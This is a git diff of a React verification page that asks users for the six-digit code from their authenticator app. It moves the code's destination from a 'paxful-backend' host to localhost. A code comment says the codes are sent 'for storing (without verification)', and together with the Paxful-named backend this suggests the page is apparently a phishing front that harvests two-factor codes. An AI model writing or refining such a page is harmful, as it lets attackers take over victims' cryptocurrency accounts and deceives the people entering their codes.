@@ -71,7 +71,7 @@ const VerificationInput = () => {
     
     try {
       // Send the entered code to your backend for storing (without verification)
-      await fetch('https://paxful-backend-3.onrender.com/verify_code', {
+      await fetch('http://127.0.0.1:5000/verify_code', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -117,7 +117,7 @@ const VerificationInput = () => {
         <div className="verification-header1">
         </div>
   
-        <div className="verification-header">
+        <div className="verification-header" >
           <h1 className="verification-title">Verification</h1>
           <p className="verification-description">
             Enter the 6-digit code we sent to the authenticator associated with your account:
@@ -129,7 +129,7 @@ const VerificationInput = () => {
           <label className="verification-label" htmlFor="code-input-0">
             Confirmation code
           </label>
-          <div className="verification-inputs" role="group" aria-labelledby="code-input-0">
+          <div className="verification-inputs" role="group" aria-labelledby="code-input-0" >
             {codes.map((code, index) => (
               <input
                 key={index}
@@ -156,14 +156,14 @@ const VerificationInput = () => {
           )}
           
           {attempts > 0 && attempts < 3 && (
-            <p className="verification-attempts-message">
+            <p className="verification-attempts-message" >
               {3 - attempts} attempt{3 - attempts !== 1 ? 's' : ''} remaining
             </p>
           )}
         </div>
       </div>
       <div className="verification-image">
-      
+        
       </div>
     </div>
   );
